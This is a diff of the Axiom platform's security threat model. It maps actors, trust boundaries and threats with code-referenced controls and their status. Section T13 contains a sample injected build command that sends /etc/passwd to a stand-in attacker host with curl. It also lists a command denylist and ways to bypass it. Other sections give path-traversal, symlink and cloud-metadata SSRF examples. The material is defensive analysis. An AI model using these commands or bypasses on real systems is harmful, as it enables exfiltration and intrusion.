@@ -1,245 +1,932 @@
-# Axiom Security Threat Model
+# Axiom Security Threat Model and Abuse Controls (V0.1)
 
-> Issue #129. DRAFT — finalizes after #88/#89.
+> Issue #129. This document replaces the earlier draft: every control below was
+> re-verified against the code at the revision recorded in section 10, with a
+> `path:line` proof. A control is listed as **EN PLACE** only when the code that
+> implements it is instantiated by a composition root, not merely present in a
+> package. Anything else is **ABSENT**, **NON CABLE** (implemented but never
+> wired) or **PARTIEL**.
 >
-> Objective: document and test the security boundary for untrusted repositories, Agents and deployment requests.
->
-> Status: **DRAFT**. This document will be finalized after issues #88 (transport hardening) and #89 (agent authorization) are resolved.
+> This document is a release gate for #111 ("V0.1 Security & Failure
+> Regression Gate"). Section 9 lists what must be closed before V0.1.
 
-## 1. Scope
+## 1. Scope, assets and trust assumptions
 
-This threat model covers the Axiom V0.1 security boundary:
+### 1.1 In scope
 
-- **Untrusted repositories**: code fetched from GitHub that is analyzed, built and deployed.
-- **Untrusted agents**: Runtime Agents on servers that execute operations dispatched by the Engine.
-- **Deployment requests**: API requests from authenticated users to deploy applications.
-- **Secrets**: GitHub tokens, agent credentials, API tokens, database credentials.
+| Surface | Where |
+|---|---|
+| Public REST API | `services/engine/internal/api`, mounted at `/api/v1` |
+| Engine outbound to GitHub | `services/engine/internal/github/**` |
+| Deployment build pipeline | `services/engine/internal/build/**` |
+| Engine -> Agent transport | `services/engine/internal/agentclient`, `services/agent/internal/security/transport` |
+| Agent inbound listener | `services/agent/internal/bootstrap/listener.go` |
+| Agent runtime adapters (Docker, Traefik) | `services/agent/internal/runtime/**` |
+| Secret storage at rest | `services/engine/internal/security/secrets`, `internal/github/auth` |
+| PostgreSQL persistence | `services/engine/migrations/**` |
 
-Out of scope (V0.1): billing, Kubernetes, multi-cloud orchestration, GitLab, advanced autonomous AI operations, marketplace, arbitrary remote shell, full organization/RBAC model (API contract §24).
+### 1.2 Out of scope (V0.1)
 
-## 2. Assets
+Billing, Kubernetes, multi-cloud, GitLab, organization/RBAC tenancy (V0.1 is
+single-user ownership, `services/engine/internal/authz/authz.go:5-8`),
+autonomous operations, marketplace, remote shell.
 
-| Asset | Description | Location |
+### 1.3 Assets
+
+| Asset | Storage | Confidentiality requirement |
 |---|---|---|
-| GitHub tokens | OAuth access/refresh tokens for repository access | `github_connections` table, AES-256-GCM sealed (`AXIOM_SECRET_KEY`) |
-| Agent credentials | Bearer credentials for agent ↔ Engine authentication | `agent_identities` table, stored as SHA-256 hashes |
-| API tokens | Interim bearer token for `/api/v1` authentication | Engine configuration (`AXIOM_API_TOKEN`) |
-| Database credentials | PostgreSQL connection string | Engine configuration (`DATABASE_URL`) |
-| Deployment plans | Immutable, single-use deployment plans with fingerprints | `deployment_plans` table |
-| Application profiles | Detected stack configuration, may contain file paths | `application_profiles` table |
-| Build artifacts | Container images with deployment metadata | Docker registry (`axiom-local`) |
-| Deployment events | Ordered event log per deployment | `deployment_events` table |
-| Logs | Redacted deployment logs | `deployment_logs` table |
+| GitHub OAuth access/refresh tokens | `github_connections.access_sealed` / `refresh_sealed`, AES-256-GCM | high |
+| Agent credentials | `agent_identities.credential_hash` (SHA-256 only) | high |
+| Agent bootstrap token | `agent_bootstrap_tokens.token_hash` (SHA-256 only) | high |
+| User password hashes | `users.password_hash`, PBKDF2-HMAC-SHA256 | high |
+| Session tokens | `sessions.token_hash` (SHA-256), plaintext in the HttpOnly cookie | high |
+| Application configuration values | `secrets.value_sealed`, AES-256-GCM, write-only at the API | high |
+| `AXIOM_SECRET_KEY`, `AXIOM_API_TOKEN`, `DATABASE_URL` | Engine process environment | critical |
+| Build workspaces | `/tmp/axiom-build/axiom-build-<random>` | medium |
+| Container images | local Docker daemon, tag `axiom-local/<slug>:<sha7>-<dep8>` | medium |
+| Audit trail | `audit_events`, redacted at write | medium |
 
-## 3. Trust boundaries
+### 1.4 Trust assumptions
 
-```mermaid
-graph TB
-    subgraph "Untrusted"
-        REPO[GitHub Repository<br/>untrusted code]
-        USER[API Client<br/>authenticated user]
-    end
+1. **The repository is untrusted.** Its content is fetched from GitHub, extracted
+   to disk and executed by the Docker daemon on the Engine host.
+2. **The agent host is semi-trusted.** The Agent holds Docker and Traefik
+   privileges on the machine where customer code runs. It is the enforcement
+   point for container ownership; a compromised Agent means host compromise.
+3. **The Engine host is trusted by Axiom.** It holds `AXIOM_SECRET_KEY` and the
+   database. The threat model does not defend the Engine host against a local
+   root attacker.
+4. **No managed secret service.** `AXIOM_SECRET_KEY` is a single 32-byte key
+   from the environment. There is no KMS, no HSM, no key rotation mechanism.
+   Rotation means re-encrypting every row by hand.
+5. **Single-process deployment.** The Engine is one process; horizontal scaling
+   would break the in-memory replay caches in section 5.1.
+6. **GitHub is a trusted identity and archive provider**, but repository content
+   is not trusted (assumption 1).
 
-    subgraph "Axiom Engine"
-        API[Public API<br/>/api/v1]
-        AUTH[Authentication<br/>TokenAuthenticator]
-        POLICY[Policy Gate<br/>policy.Evaluate]
-        EXEC[Executor<br/>PlanExecutor]
-        BUILD[Build Engine<br/>build.Engine]
-        SNAP[Snapshot<br/>snapshot.FromTarGz]
-        GH[GitHub Adapter<br/>repos.Service]
-        DOM[Domains<br/>domains.Service]
-        SRV[Server Registry<br/>server.Service]
-        DB[(PostgreSQL<br/>primary datastore)]
-        SSE[SSE Handler<br/>sse.Handler]
-    end
+## 2. Actor and attack-surface matrix
 
-    subgraph "Server (untrusted host)"
-        AGENT[Runtime Agent<br/>agent.go]
-        DOCKER[Docker Daemon]
-        TRAEFIK[Traefik + ACME]
-    end
+| Actor | Capabilities | Reachable surface | Authentication | Effective authorization |
+|---|---|---|---|---|
+| Anonymous internet | TCP to the Engine if `0.0.0.0` is exposed | `/health`, `/ready`, `/metrics`, `/api/v1/auth/register`, `/api/v1/auth/login`, `/api/v1/github/callback` | none on the first three; self-service on register/login | none (registration is open) |
+| Authenticated user (low privilege) | session cookie or bearer | all `/api/v1` routes for owned resources | `SessionAuthenticator` | `authz.Resolver` + 404-hiding |
+| Machine client | `AXIOM_API_TOKEN` | all `/api/v1` routes | constant-time SHA-256 compare | maps to the single `usr_local` principal, i.e. full owner rights |
+| Rogue agent | network reach to the Engine | `/api/v1/agent/register`, `/rotate`, `/heartbeat` | bootstrap token, then credential + nonce + timestamp | bound to one server |
+| Compromised Engine | holds `AXIOM_SECRET_KEY` | everything | n/a | full |
+| Malicious repository | content only | build pipeline, analyzer, compose parser | n/a | denylist on commands, compose policy |
+| Compromised Agent host | root-equivalent | everything on the host | n/a | none needed |
 
-    subgraph "External"
-        GITHUB[GitHub API]
-        LETSENCRYPT[Let's Encrypt]
-    end
+### 2.1 Network exposure
 
-    USER -->|HTTPS + Bearer| API
-    REPO -->|tarball| GH
-    GH -->|HTTPS| GITHUB
-    API --> AUTH
-    AUTH --> POLICY
-    POLICY --> EXEC
-    EXEC --> BUILD
-    BUILD --> SNAP
-    EXEC -->|operations| AGENT
-    AGENT -->|Docker API| DOCKER
-    AGENT -->|dynamic config| TRAEFIK
-    TRAEFIK -->|ACME| LETSENCRYPT
-    API --> DB
-    EXEC --> DB
-    SSE --> DB
-    GH -->|sealed tokens| DB
+| Endpoint | Bind | TLS | Authentication |
+|---|---|---|---|
+| Engine HTTP | `0.0.0.0:8080` by default (`config.go:17-18`, `:95`) | none in-process; TLS is expected from a front proxy (ADR-0005) | middleware chain |
+| Engine `/health`, `/ready`, `/metrics` | same, **outside** the auth chain (`httpserver/server.go:50-76` vs `api.go:205`) | idem | **NONE** |
+| Agent operation listener | `127.0.0.1:9401` by default (`services/agent/internal/config/config.go:35`) | **none, no implementation exists** (#88) | `refuseInbound`, rejects everything |
+| Agent -> Engine | https required in production (`config.go:184-193`, `transport.go:79-86`) | yes in production | bearer + nonce + timestamp |
+
+## 3. Threats: Engine/Agent boundary
+
+### T1. Spoofing — rogue agent registration
+
+**Scenario.** An attacker who observes or guesses a pending bootstrap token
+calls `POST /api/v1/agent/register` with his own `serverId`, binds an agent
+identity to the victim's server, and then receives a long-lived credential
+(90 days) that lets him forge heartbeats for that server.
+
+**Controls.**
+- Bootstrap token is single-use, bound to a server, TTL 15 min:
+  `services/engine/internal/agentauth/service.go:24`, `:188-211`,
+  `:227` (`ConsumeBootstrapToken`), `:231-233` (`ErrServerMismatch`).
+- Token stored only as a SHA-256 hash: `service.go:207` (`hashToken`), `:508-511`.
+- The endpoint bypasses the user authenticator
+  (`services/engine/internal/api/agent.go:17-19`, `:23-32`) and authenticates in
+  the handler from the bearer token (`agent.go:74-78`, `:101`).
+- Issuance requires the caller to own the server
+  (`services/engine/internal/api/agent.go:45-53`).
+
+**State: EN PLACE**, except that tokens are issued over a channel that has no
+TLS of its own (T8).
+
+### T2. Spoofing — forged or replayed agent requests
+
+**Scenario.** An attacker captures one heartbeat (credential in the
+`Authorization` header) and replays it to keep a dead server reported READY, or
+to skew resource metrics.
+
+**Controls.**
+- Credential + `X-Nonce` + `X-Timestamp`, freshness checked before the body is
+  read: `api/agent_heartbeat.go:47-52`, `agentauth/service.go:344-353`,
+  `:433-448`.
+- Nonce single-use in a 10-minute in-memory window:
+  `agentauth/service.go:32`, `:473-498`.
+- Clock skew bounded to 5 minutes: `agentauth/service.go:30`, `:441`.
+- Heartbeat payload identity must match the authenticated identity:
+  `api/agent_heartbeat.go:84-86`.
+- Revocation checked on every use (identity status **and** server status):
+  `agentauth/service.go:451-463`.
+
+**State: EN PLACE.** Residual: the nonce cache is per-process and in memory
+(`service.go:473-482`), so a restart or a second Engine replica accepts replays
+inside the window. Low severity given the 5-minute skew bound.
+
+### T3. Repudiation — credential theft
+
+**Scenario.** An attacker with read access to PostgreSQL recovers agent
+credentials and impersonates agents.
+
+**Controls.**
+- Only hashes are persisted: `agentauth/service.go:270`, `:310`, `:508-511`.
+- Plaintext is returned exactly once at issue/redeem
+  (`api/agent.go:193-203`) and never logged: `api/agent.go:241-252` logs action,
+  agentId and reason only.
+- Rotation with a 5-minute grace: `agentauth/service.go:28`, `:321-326`.
+
+**State: EN PLACE.** Residual: SHA-256 without a work factor on a
+256-bit random token is acceptable (the token is not guessable and not
+password-derived).
+
+### T4. Tampering — forged operations sent to an Agent
+
+**Scenario.** An attacker reaches the Agent's operation listener and posts a
+`CREATE_RUNTIME`/`REMOVE` operation to take over or delete containers.
+
+**Controls.**
+- The listener authenticates **before** reading the body and before dispatching:
+  `services/agent/internal/bootstrap/listener.go:112-119`.
+- The only authenticator injected by the composition root rejects every request:
+  `bootstrap.go:212` (`refuseInbound`), `listener.go:47-52`.
+- Envelope, closed operation set, operation ID, deployment ID, mandatory
+  application ID and server-identity binding are validated again in the
+  dispatcher: `listener.go:133-136`, `protocol.go:211-235`,
+  `dispatcher.go:315`.
+- Strict decoding, unknown field = malformed: `listener.go:147-157`.
+- Body bound: `listener.go:20-21` (64 KiB), `:121-125`.
+
+**State: EN PLACE (fail-closed), and the reverse direction is equally blocked.**
+
+### T5. Tampering — an Agent that accepts work it should not
+
+**Scenario.** Once the Engine->Agent credential direction exists, a replayed or
+stale operation from a compromised Engine makes an Agent create a container for
+the wrong application.
+
+**Controls.**
+- Deterministic operation IDs and terminal-state replay rejection in the durable
+  state store: `bootstrap.go:255-278` (returns `CodeReplayed`).
+- Server-identity binding: `protocol.go:230-233`.
+- Application scope mandatory, never defaulted: `protocol.go:224-229`.
+
+**State: EN PLACE for the Agent side. The Engine does not currently send a
+compliant message — see E3 in section 9.**
+
+### T6. Spoofing — container belonging to another application
+
+**Scenario.** Operation A of deployment D1 asks the Agent to `START`,
+`STOP` or `REMOVE` a container created by deployment D2. If ownership is only
+checked as "is this container Axiom-managed at all", D1 can destroy D2.
+
+**Controls.**
+- Canonical label set stamped at create:
+  `services/agent/internal/runtime/docker/docker.go:589-602`,
+  `services/agent/internal/security/ownership/*.go` (`NewLabels`,
+  `IsManaged`, `AssertContainer`).
+- `Start`, `Stop`, `Remove` all gate on `verifyManaged`:
+  `docker.go:368`, `:376`, `:385`, defined at `:553-562` (managed-only, see the
+  state note below).
+- Traefik routing enforces the full application+deployment scope through a live
+  Docker inspect: `services/agent/internal/bootstrap/bootstrap.go:165-172`,
+  `services/agent/internal/runtime/traefik/traefik.go:265-274`.
+- Canonical labels cannot be overridden by the caller:
+  `docker.go:591-597`.
+
+**State: PARTIEL — see G3.** `ownership.assertScope` is now the strict
+check: `axiom.managed=true`, plus `axiom.application` and `axiom.deployment`
+both equal to the operation scope
+(`services/agent/internal/security/ownership/ownership.go:139-150`), and the
+scope reaches the adapters through `runtimeBridge.scope()`
+(`services/agent/internal/bootstrap/bridge.go:84-86`) and
+`dispatcher.go:162`. CREATE_RUNTIME and NETWORK enforce it
+(`bridge.go:89-117`, `traefik.go:265-274`). **START, STOP and REMOVE do not**:
+they call `Adapter.verifyManaged`
+(`services/agent/internal/runtime/docker/docker.go:368`, `:376`, `:385`),
+which still tests only `ownership.IsManaged` (`docker.go:553-562`) and never
+compares a label to the operation scope. A STOP or REMOVE for deployment D1
+therefore accepts a container belonging to D2 on the same server.
+
+### T7. Information disclosure — cross-tenant reads
+
+**Scenario.** User B calls `GET /api/v1/servers` or
+`GET /api/v1/servers/{id}` and enumerates user A's servers, their addresses,
+agent versions and health.
+
+**Controls.**
+- Applications: `ownedApplication` returns 404 for a foreign record:
+  `api/handlers.go:78-96`.
+- Deployments: ownership resolved through the parent application:
+  `api/handlers.go:409-429`, `:435-444`.
+- SSE stream: `api/api.go:194` + `api/handlers.go:447-454`.
+- Application configuration: `api/appconfig.go:43-52`.
+- GitHub connections: scoped by `principal.UserID` at every call site,
+  e.g. `api/github.go:82`.
+- Audit trail: filtered by `OwnerID` at the query, `api/audit.go:27-31`.
+- Servers: writes check ownership (`api/handlers.go:221-225`, `:252-256`).
+
+**State: ABSENT for the server read paths — see E5 in section 9.**
+`listServers` (`api/handlers.go:136-160`) calls
+`Servers.ListFiltered(ctx, status, limit, offset)` with no owner predicate, and
+the SQL has none: `internal/database/repositories.go:236-241` selects on status
+only. `getServer` (`:174-181`) and `serverHealth` (`:265-273`) go through
+`loadServer` (`:162-172`), which performs **no** authorization at all.
+
+## 4. Threats: secrets
+
+### T8. Information disclosure — secrets at rest
+
+**Scenario.** An attacker reads PostgreSQL or a backup and recovers GitHub
+tokens, which grant repository access on the user's behalf.
+
+**Controls.**
+- AES-256-GCM with a per-value random nonce:
+  `internal/security/secrets/box.go:50-59`.
+- Ciphertext bound to its owner as AAD, so ciphertexts cannot be swapped between
+  records: `secrets/store.go:37` (`scope/name`) and
+  `internal/github/auth/service.go:179`, `:185` (`github-access:<id>`).
+- `AXIOM_SECRET_KEY` required in production and whenever GitHub is configured:
+  `internal/config/config.go:169-171`, `:182-184`; the key itself is never
+  logged (no logging statement in `config.go`).
+- Application configuration values are write-only at the API layer: metadata
+  only, `internal/secrets/appconfig.go:60-70`, `api/appconfig.go:21-35`.
+
+**State: EN PLACE.** Residual: one static key, no rotation path, and the
+`secrets` table is readable by anyone with a SQL connection.
+
+### T9. Information disclosure — secrets in logs and diagnostics
+
+**Scenario.** A build or runtime log line contains a token; an attacker reads
+the deployment logs through the API.
+
+**Controls.**
+- Redaction before persistence: `internal/logs/store.go:65`,
+  `internal/logs/redact.go:28-35` (PEM blocks, URL credentials, bearer tokens,
+  JSON and key=value secrets).
+- Redaction of every audit field at write: `internal/audit/audit.go:107-125`.
+- Redaction of the whole structured-log sink:
+  `internal/observability/logging/redact.go:26-97`.
+- Access log records method, path and status only, never headers, query strings
+  or bodies: `api/middleware.go:61-71`.
+- Agent-side redaction mirrors the Engine:
+  `services/agent/internal/logs/logs.go:282-291`.
+- 5xx responses never carry internal detail: `api/http.go:31-36`,
+  `api/errors.go:107-109`.
+- Panic recovery returns a stable envelope: `api/middleware.go:74-87`.
+
+**State: EN PLACE.** Residual: `logs.Redact` is pattern-based. A secret in an
+unrecognized format (an AWS key without its `AWS_SECRET_ACCESS_KEY=` prefix, a
+JWT) is not redacted.
+
+### T10. Information disclosure — secrets into the build environment
+
+**Scenario.** A malicious repository's `RUN` step reads `DATABASE_URL` or
+`AXIOM_SECRET_KEY` from the build process environment and exfiltrates it. This
+was exploitable until the fix below landed: `if b.Env != nil` left `cmd.Env`
+nil, and a nil `exec.Cmd.Env` inherits the whole Engine process environment.
+
+**Controls.**
+- The workspace itself contains no control-plane credential:
+  `internal/build/workspace/workspace.go:1-6` (package doc), `:62-82` (0700,
+  random name).
+- The container environment is explicitly caller-approved only, never augmented
+  from the host: `services/agent/internal/runtime/docker/docker.go:201-205`.
+- Secret-like repository files are never retained by the analyzer:
+  `internal/analyzer/snapshot/snapshot.go:168`, `:216-217`.
+- The `docker build` child gets an explicit minimal environment, never the
+  Engine's: `cmd.Env = childEnv(os.Environ(), b.Env)` is unconditional
+  (`services/engine/internal/build/builder.go:156-158`). `childEnv`
+  (`builder.go:88-117`) copies only the `buildEnvNames` allowlist
+  (`builder.go:55-72`) from the parent and layers caller-requested
+  `ExecBuilder.Env` on top with override on key collision.
+
+**State: EN PLACE — corrected since the audit draft (was ABSENT for the Engine
+build process; the divergence recorded as E1 is resolved).** Until the fix, the
+child environment was only overridden when `ExecBuilder.Env` was non-nil, and
+`bootstrap.go:250` leaves it nil, so `docker build` ran with `DATABASE_URL`,
+`AXIOM_SECRET_KEY`, `AXIOM_API_TOKEN` and `AXIOM_GITHUB_CLIENT_SECRET` in its
+process environment — exactly what the scenario above describes. `childEnv` now
+keeps only `buildEnvNames` (`builder.go:55-72`: PATH, HOME, TMPDIR, locale,
+`DOCKER_*`, HTTP(S)/`NO_PROXY`, GOPROXY/GOPRIVATE/GOSUMDB) from the parent,
+adds caller-requested `ExecBuilder.Env` on top with override on key collision,
+and falls back to `defaultPATH` (`builder.go:52-53`) when neither provides one.
+Non-regression tests: `TestExecBuilderNilEnvDoesNotInheritEngineEnvironment`,
+`TestExecBuilderExplicitEnvIsCallerRequestedOnly` and `TestChildEnv`
+(`services/engine/internal/build/builder_test.go:120`, `:142`, `:174`).
+
+## 5. Threats: build pipeline
+
+### T11. Tampering — arbitrary code execution via repository Dockerfile
+
+**Scenario.** A user connects a hostile repository whose `Dockerfile` contains
+`RUN --mount=type=bind,from=...` or simply exfiltrates the source over the
+network during `docker build`. The Dockerfile is executed by the Docker daemon
+running as root on the Engine host.
+
+**Controls.**
+- A repository Dockerfile is used as-is when the strategy is `dockerfile`:
+  `internal/build/engine.go:228-236`. There is **no** inspection, sandboxing or
+  rewriting of its instructions.
+- No network restriction is passed to the builder: the argument list is
+  `build --iidfile <tmp> -f <df> -t <tag> --label ... <ctx>`,
+  `internal/build/builder.go:74-81`. No `--network=none`.
+- No resource limits and no `--security-opt` are passed:
+  `builder.go:74-81`.
+- The command line is built from argv only, never through a shell:
+  `builder.go:83`.
+- The build is time-bounded (10 minutes by default): `builder.go:59-63`.
+
+**State: PARTIEL — accepted for V0.1 with a compensating control.** Archive
+extraction is hardened (T12), and the build timeout bounds resource abuse, but
+**code execution inside the builder is unrestricted by design**. This is the
+single largest residual risk in the product and is listed as blocking in section 9.
+
+### T12. Tampering — archive path traversal and symlink escape
+
+**Scenario.** A tarball contains `../../etc/cron.d/x` or a symlink to
+`/var/lib/axiom-agent/credential.json` to read the Agent's credential through
+the build context.
+
+**Controls.**
+- Absolute paths, `..` segments, backslashes and NUL bytes rejected:
+  `internal/build/workspace/workspace.go:201-212`.
+- Symlinks, hardlinks and device nodes are skipped, never followed:
+  `workspace.go:149-152`.
+- Duplicate paths refused by `O_EXCL`: `workspace.go:175`.
+- Size limits (200 MiB compressed, 1 GiB total, 50 000 files, 100 MiB per file):
+  `workspace.go:41-46`, enforced at `:107`, `:159-169`.
+- Compose build context cannot escape the workspace:
+  `internal/build/compose.go:119-133`.
+
+**State: EN PLACE.**
+
+### T13. Tampering — command injection through build/start commands
+
+**Scenario.** A repository ships `axiom.yaml` with
+`build.command: "npm run build; curl http://attacker/$(cat /etc/passwd)"`, which
+is interpolated into `RUN ...` in a generated Dockerfile.
+
+**Controls.**
+- `axiom.yaml` commands pass through `presets.ValidateCommand` before becoming
+  hints: `internal/manifest/hints.go:24-29`.
+- `ValidateCommand`: single line of printable ASCII, 500 chars max, denylist on
+  backtick, `$(`, `<<`, `sudo `, `rm -rf /`, `curl `, `wget `:
+  `internal/profile/presets/presets.go:197-213`.
+- The plan validator re-checks both commands:
+  `internal/planner/validation/validation.go:97-103`.
+- Quote escaping on `CMD`: `internal/build/dockerfile.go:88-90`,
+  `internal/runtime/presets/node/dockerfile.go:162-164`.
+- Compose build path uses the repository Dockerfile rather than a generated one:
+  `internal/build/compose.go:62-80`.
+
+**State: PARTIEL.** The denylist is bypassable — `;`, `|`, `&`, `>`, `\n` via
+`$()`, `${IFS}`, `eval`, `python -c`, or simply `apt-get install` are not
+blocked, and `presets.ValidateCommand` is a blocklist rather than an allowlist.
+The mitigation that actually holds is T11's residual risk being inherent to
+building user code at all; the blocklist only removes the *noisy* vectors.
+
+### T14. Tampering — Compose privilege escalation
+
+**Scenario.** A repository's `compose.yaml` requests `privileged: true`,
+`network_mode: host`, or bind-mounts `/var/run/docker.sock`.
+
+**Controls.**
+- Blocking rules with stable codes: `internal/runtime/presets/compose/validate.go:126-174`
+  (`COMPOSE_PRIVILEGED`, `COMPOSE_NETWORK_MODE_HOST`, `COMPOSE_PID_HOST`,
+  `COMPOSE_IPC_HOST`, `COMPOSE_HOST_MOUNT_SENSITIVE`,
+  `COMPOSE_PRIVILEGED_PORT`), sensitive-path list at `:71-96`.
+- Any blocking issue aborts the build:
+  `internal/build/compose.go:44-47`.
+- The plain (non-Compose) path cannot request privileges at all: the Agent's
+  `docker create` argument list is fixed
+  (`services/agent/internal/runtime/docker/docker.go:325-342`).
+
+**State: EN PLACE.**
+
+### T15. Supply chain — unpinned base images
+
+**Scenario.** `node:20-alpine` or `golang:1.23-alpine` is re-published upstream
+with a malicious layer; every Axiom build inherits it.
+
+**Controls.** None. Base images are floating tags:
+`internal/runtime/presets/node/node.go:34-35`,
+`internal/build/dockerfile.go:51`. Generated Dockerfiles carry no digest pin.
+
+**State: ABSENT.** Recorded as an accepted V0.1 risk; no external registry trust
+policy exists.
+
+### T16. Supply chain — dependency scanning
+
+**Scenario.** A vulnerable transitive Go or npm dependency ships a CVE.
+
+**Controls.** None. The CI (`.github/workflows/go.yml:33-49`) runs `gofmt`,
+`go vet`, `go test -race` and an end-to-end job; there is no `govulncheck`, no
+`npm audit`, no OSV or Trivy step, and no image scan. `apps/cloud` has a
+lockfile (`apps/cloud/package-lock.json`) but no audit gate, and the
+`@axiom/cloud` build is not part of any workflow.
+
+**State: ABSENT.**
+
+## 6. Threats: API surface
+
+### T17. Spoofing — unauthenticated API access
+
+**Scenario.** An attacker probes `/api/v1/applications` without credentials.
+
+**Controls.**
+- Every route except the three public ones sits behind the authenticate
+  middleware: `api/api.go:204-209`, `api/middleware.go:186-203`.
+- Fail-closed when no authenticator is configured: `api/api.go:121-123`,
+  `middleware.go:146-149` (`denyAll`).
+- Session token comparison is constant-time; the static token is hashed and
+  compared with `subtle.ConstantTimeCompare`:
+  `api/auth_session.go:50-55`.
+- Session and machine token validated against the store:
+  `api/auth_session.go:59-63`, `:73-77`.
+
+**State: EN PLACE.** Residual: in development without `AXIOM_API_TOKEN`, every
+request is authenticated as the local operator: `bootstrap.go:152-154`,
+`api/middleware.go:140-144`.
+
+### T18. Tampering — CSRF on cookie sessions
+
+**Scenario.** A malicious page makes the victim's browser `DELETE
+/api/v1/servers/{id}` using the session cookie.
+
+**Controls.**
+- Double-submit token required on mutating cookie-authenticated requests:
+  `api/middleware.go:175-184`, enforced at `:198-201`.
+- Cookie is `HttpOnly`, `SameSite=Lax`, `Secure` in production:
+  `api/auth_session.go:282-291` (`Secure: a.secure`, defaulted to production at
+  `internal/config/config.go:110`).
+- Bearer clients are exempt because they do not rely on ambient cookies:
+  `api/middleware.go:176`.
+
+**State: EN PLACE.**
+
+### T19. Information disclosure — credential stuffing
+
+**Scenario.** An attacker scripts `POST /api/v1/auth/login` against known
+emails.
+
+**Controls.**
+- Passwords hashed with PBKDF2-HMAC-SHA256, 200 000 iterations, per-user
+  128-bit salt, constant-time verification:
+  `internal/auth/password.go:24-29`, `:33-45`, `:49-68`.
+- Generic error on bad credentials: `api/auth_session.go:135-137`.
+- Length and complexity floors: `api/auth_session.go:110-113`.
+
+**State: PARTIEL — no rate limiting and no lockout. See T20.** The code itself
+labels PBKDF2 as an interim decision below current guidance
+(`internal/auth/password.go:15-23`).
+
+### T20. Denial of service — API flooding
+
+**Scenario.** An attacker floods `/api/v1/auth/login`, `/api/v1/applications` or
+the agent endpoints to exhaust CPU, PostgreSQL connections or memory.
+
+**Controls.**
+- Request body capped at 1 MiB: `api/http.go:17`, `:58`.
+- Pagination bounded to 100 items: `api/http.go:88-110`.
+- GitHub upstream rate limits normalized to 429: `api/errors.go:91-92`.
+- Agent endpoints require a valid credential per request: `api/agent.go:17-19`.
+- Body and header timeouts on both servers: `bootstrap.go:110-112`,
+  `services/agent/internal/bootstrap/bootstrap.go:215-219`.
+
+**State: ABSENT for general API rate limiting.** There is no rate-limit
+middleware in `services/engine/internal/api` (grep for `rate` returns only
+pagination and the GitHub error mapping). A `RateLimiter` exists in
+`services/agent/internal/security/transport/transport.go:117-159` but **no
+caller instantiates it** (grep for `NewRateLimiter` outside tests returns
+nothing) — NON CABLE. `POST /api/v1/auth/register` is public and unauthenticated,
+so account creation is also unbounded.
+
+### T21. Information disclosure — secret leakage in error responses
+
+**Scenario.** A 500 response body reveals a SQL fragment containing a
+connection string.
+
+**Controls.**
+- Unknown errors collapse to `INTERNAL_ERROR` with a fixed message:
+  `api/errors.go:107-109`.
+- Server-side detail is logged redacted, never returned: `api/http.go:31-36`.
+- Panic path returns a stable envelope: `api/middleware.go:81-83`.
+
+**State: EN PLACE.**
+
+### T22. Tampering — idempotency key replay across actors
+
+**Scenario.** User B reuses user A's `Idempotency-Key` to obtain user A's
+deployment record.
+
+**Controls.**
+- Key namespaced per actor, operation and application:
+  `internal/deployment/store.go:73-76`.
+- Unique constraint plus request-hash mismatch -> 409:
+  `internal/database/deployment/store.go:84-113`,
+  `api/errors.go:77-78`.
+- Key length bounded at 255: `api/handlers.go:294-297`.
+
+**State: EN PLACE.**
+
+### T23. Spoofing — SSRF through repository URLs
+
+**Scenario.** A user supplies a repository URL pointing at
+`http://169.254.169.254/` to read cloud instance metadata or an internal
+service.
+
+**Controls.**
+- No arbitrary URL is ever fetched. The archive is built from
+  `s.APIURL + <owner>/<repo>/tarball/<sha40>`, with the SHA shape validated:
+  `internal/github/repos/repos.go:271-283`.
+- `APIURL` comes from configuration, not from the request:
+  `internal/config/config.go:117`.
+- No agent-computable health path outside the deployed application: the probe
+  URL is `http://<domain><path>`, with the domain shape-validated
+  (`internal/planner/validation/validation.go:107-109`) and the path required to
+  start with `/` (`:112-114`).
+
+**State: EN PLACE.** Residual: the archive HTTP client has no global timeout
+and streams unbounded (`repos.go:288`), relying on the context and the
+workspace extraction limits.
+
+### T24. Information disclosure — hostnames claimed by another application
+
+**Scenario.** User A registers `victim.example.com` and intercepts the traffic
+of user B's application deployed on the same hostname.
+
+**Controls.**
+- `hostname` is globally unique: `migrations/003_v01_core_schema.sql:164`.
+- Hostname shape constrained by a CHECK including lowercase:
+  `003_v01_core_schema.sql:160`, relaxed to single labels by
+  `migrations/007_domain_single_label.sql:5-7`.
+- `EnsureDomain` refuses an unregistered hostname when the environment already
+  has one: `internal/domains/domains.go:179-194`.
+- DNS verification compares resolution against the server address:
+  `internal/domains/verify.go:35-64`.
+
+**State: EN PLACE.** Residual: the CHECK permits single-label hostnames
+(`localhost`, and any bare label), which is a hostname-squatting surface on
+intranet deployments.
+
+## 7. Threats: Agent runtime
+
+### T25. Tampering — Traefik configuration injection
+
+**Scenario.** A crafted domain or container name injects YAML into Traefik's
+file provider and hijacks routing for another tenant.
+
+**Controls.**
+- Domain validated as a bare lowercase hostname, no scheme/port/whitespace:
+  `services/agent/internal/runtime/traefik/traefik.go:78-114`, applied at `:178`.
+- Container name must match the Axiom naming rules: :266-267.
+- Deployment ID must match `dep_[0-9a-f]{24}`: `:71`, `:175`.
+- Only `axiom-<deploymentID>.yml` is ever written, read or removed:
+  `:324-327`, `:329-340`.
+- Atomic write (temp file, fsync, chmod, rename): `:330-363`.
+- Ownership asserted against a live Docker inspect before any routing change:
+  `services/agent/internal/bootstrap/bootstrap.go:165-172`.
+- Reconcile never touches a file whose name is not a valid deployment ID:
+  `traefik.go:242-258`.
+
+**State: EN PLACE.** Residual: the ACME resolver is fixed to `le` and the
+static entrypoints are operator-managed (documented at `:25-27`), which is the
+correct ownership split.
+
+### T26. Denial of service — container port exhaustion
+
+**Scenario.** A user deploys many applications, each claiming a host port, until
+the host runs out.
+
+**Controls.**
+- The host port is ephemeral and bound to loopback only:
+  `services/agent/internal/runtime/docker/docker.go:320` (`-p 127.0.0.1::<port>`).
+  A conflict is therefore impossible between Axiom containers.
+- Compose host ports below 1024 are rejected:
+  `internal/runtime/presets/compose/validate.go:162-166`.
+- Port range validated at the protocol, adapter and plan layers:
+  `protocol.go:254-...`, `docker.go:228-230`,
+  `internal/planner/validation/validation.go:104-106`.
+
+**State: EN PLACE** (detection plus prevention by design).
+
+### T27. Information disclosure — container isolation is Docker-default only
+
+**Scenario.** An escaped or vulnerable application container reaches other
+containers, the host network or the Docker socket.
+
+**Controls.**
+- No privileged mode, no host namespaces: the create argument list is fixed
+  (`docker.go:325-342`).
+- Resource limits accepted and applied when set: `docker.go:329-334`.
+- Compose policy blocks the equivalent host-namespace escapes:
+  `internal/runtime/presets/compose/validate.go:136-151`.
